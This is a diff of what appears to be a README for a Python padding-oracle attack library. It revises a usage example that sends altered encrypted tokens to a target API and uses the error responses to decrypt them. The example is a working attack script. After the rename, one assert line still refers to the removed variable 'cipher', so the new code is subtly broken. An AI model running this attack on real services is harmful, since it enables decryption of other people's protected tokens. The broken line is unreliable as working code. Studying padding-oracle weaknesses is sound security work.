@@ -33,13 +33,13 @@ Let's say we are going to test `https://the.target.site/api/?token=BASE64_ENCODE
 
 ```python
 from padding_oracle import padding_oracle, base64_encode, base64_decode
-import requests, string
+import requests
 
-sess = requests.Session() # for connection pool
-url = 'https://the.target.site/api/'
+sess = requests.Session() # use connection pool
+url = 'https://example.com/api/'
 
-def check_decrypt(cipher: bytes):
-    resp = sess.get(url, params={'token': base64_encode(cipher)})
+def oracle(ciphertext: bytes):
+    resp = sess.get(url, params={'token': base64_encode(ciphertext)})
 
     if 'failed' in resp.text:
         return False
@@ -48,16 +48,16 @@ def check_decrypt(cipher: bytes):
     else:
         raise RuntimeError('unexpected behavior')
 
-cipher = base64_decode('BASE64_ENCODED_TOKEN')
+ciphertext = base64_decode('BASE64_ENCODED_TOKEN')
 # becomes IV + block1 + block2 + ...
+
 assert len(cipher) % 16 == 0
 
 plaintext = padding_oracle(
-    cipher, # cipher bytes
+    ciphertext, # cipher bytes
     block_size = 16,
-    oracle = check_decrypt,
+    oracle = oracle,
     num_threads = 16,
-    chars = string.printable # possible plaintext chars
 )
 ```
 
